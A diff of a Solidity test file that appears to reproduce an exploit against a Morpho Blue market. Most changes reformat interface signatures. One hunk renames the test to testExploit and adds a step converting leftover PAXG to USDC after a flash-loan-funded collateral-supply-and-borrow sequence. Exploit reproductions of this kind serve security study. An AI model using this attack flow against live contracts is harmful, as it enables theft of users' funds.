@@ -120,7 +120,9 @@ interface IMorphoBundler {
         address receiver
     ) external payable;
 
-    function multicall(bytes[] memory data) external payable;
+    function multicall(
+        bytes[] memory data
+    ) external payable;
 
     function nativeTransfer(address recipient, uint256 amount) external payable;
 
@@ -164,9 +166,13 @@ interface IMorphoBundler {
 
     function transferFrom2(address asset, uint256 amount) external payable;
 
-    function unwrapNative(uint256 amount) external payable;
+    function unwrapNative(
+        uint256 amount
+    ) external payable;
 
-    function unwrapStEth(uint256 amount) external payable;
+    function unwrapStEth(
+        uint256 amount
+    ) external payable;
 
     function urdClaim(
         address distributor,
@@ -177,9 +183,13 @@ interface IMorphoBundler {
         bool skipRevert
     ) external payable;
 
-    function wrapNative(uint256 amount) external payable;
+    function wrapNative(
+        uint256 amount
+    ) external payable;
 
-    function wrapStEth(uint256 amount) external payable;
+    function wrapStEth(
+        uint256 amount
+    ) external payable;
 
     receive() external payable;
 }
@@ -297,9 +307,12 @@ contract MorphoBlue is BaseTestWithBalanceLog {
         fundingToken = USDC;
     }
 
-    function testCase() public balanceLog {
+    function testExploit() public balanceLog {
         // Initiate a flash loan of PAXG from the Uniswap V2 pair
         IUniswapV2Pair(PAXG_WETH_V2_PAIR).swap(PAXG_FLASHLOAN_AMOUNT, 0, address(this), new bytes(100));
+        //At the end we swap any PAXG if remaining to USDC
+        uint256 paxgBal = TokenHelper.getTokenBalance(PAXG, address(this));
+        if (paxgBal > 0) _v3Swap(PAXG, USDC, paxgBal, address(this));
     }
 
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
@@ -354,8 +367,7 @@ contract MorphoBlue is BaseTestWithBalanceLog {
         // Prepare multicall data
         bytes[] memory calls = new bytes[](3);
         calls[0] = abi.encodeWithSelector(IMorphoBundler.erc20TransferFrom.selector, asset, amount);
-        calls[1] =
-            abi.encodeWithSelector(IMorphoBundler.morphoSupplyCollateral.selector, marketParams, amount, onBehalf, "");
+        calls[1] = abi.encodeWithSelector(IMorphoBundler.morphoSupplyCollateral.selector, marketParams, amount, onBehalf, "");
         calls[2] = abi.encodeWithSelector(
             IMorphoBundler.morphoBorrow.selector,
             marketParams,
